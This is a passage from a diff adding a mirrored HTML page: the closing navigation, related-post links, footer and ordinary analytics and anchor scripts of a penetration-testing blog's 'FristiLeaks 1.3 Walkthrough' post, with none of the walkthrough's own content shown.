+<a href="https://plus.google.com/share?url=https://highon.coffee/blog/fristileaks-walkthrough/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
+<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/fristileaks-walkthrough/&amp;title=FristiLeaks%201.3%20Walkthrough" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
+<h2><br>Follow Arr0way</h2>
+<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
+<p><br></p>
+</div>
+</div>
+<h2><br>Also... <br> <br>You might want to read these</h2>
+</div>
+</div>
+</section>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Post Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>kali linux</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sleepy-ctf-walkthrough/index.html">/dev/random: Sleepy Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../pipe-ctf-walkthrough/index.html">/dev/random Pipe walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../lord-of-the-root-walkthrough/index.html">Lord of the Root Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="../index.html">All Blog</a>
+</li>
+<li class="">
+<a href="../cheat-sheet/index.html">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="../techniques/index.html">Techniques</a>
+</li>
+<li class="">
+<a href="../security-hardening/index.html">Security Hardening</a>
+</li>
+<li class="">
+<a href="../walkthroughs/index.html">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+<li class="">
+<a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
+</li>
+
+<li class="">
+<a href="../vi-cheat-sheet/index.html">Vi Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="../cheat-sheet/index.html">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="current">
+<a href="index.html">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="">
+<a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="../walkthroughs/index.html">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="">
+<a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH & Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="../techniques/index.html">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="../security-hardening/index.html">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="../urandom/index.html">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
+</li>
+<li class="">
+<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
+</li>
+
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li class="">
+<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
+</li>
+<li class="">
+<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
+</li>
+<li class="">
+<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are &copy;&nbsp;2017 <a href="http://highon.coffee/">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<img src="https://highon.coffee/img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script data-cfasync="false" src="https://highon.coffee/cdn-cgi/scripts/ddc5a536/cloudflare-static/email-decode.min.js"></script><script>
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55017594-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+
+<!-- Mirrored from highon.coffee/blog/fristileaks-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:04:48 GMT -->
+</html>
